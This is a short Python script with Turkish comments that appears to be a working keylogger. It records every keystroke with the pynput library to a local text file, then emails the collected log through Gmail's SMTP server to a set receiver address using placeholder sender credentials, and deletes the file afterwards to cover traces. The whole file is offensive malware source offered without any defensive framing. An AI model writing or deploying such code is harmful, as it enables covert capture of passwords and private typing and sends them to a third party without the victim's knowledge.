import os
import smtplib
from pynput.keyboard import Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Günlük dosyası yolu
log_file = "klavye_gunlugu.txt"

# E-posta ayarları
sender_email = "gonderici@gmail.com"
sender_password = "gonderici_sifresi"
receiver_email = "alici@gmail.com"

def on_press(key):
    # Basılan tuşları günlüğe kaydet
    with open(log_file, "a") as f:
        f.write(str(key))

def send_email():
    # E-posta içeriğini oluştur
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Günlük Klavye Günlüğü"

    # Dosyayı ekleyerek e-posta içeriğine ekle
    with open(log_file, "r") as f:
        content = f.read()
    body = MIMEText(content)
    message.attach(body)

    # E-posta sunucusuna bağlan ve gönder
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, message.as_string())

# Klavye dinleyiciyi başlat
with Listener(on_press=on_press) as listener:
    # Program çalışırken günlük dosyasını sıfırla
    open(log_file, "w").close()

    # Programı kapatana kadar dinle
    listener.join()

# E-postayı gönder
send_email()

# Günlük dosyasını temizle
os.remove(log_file)
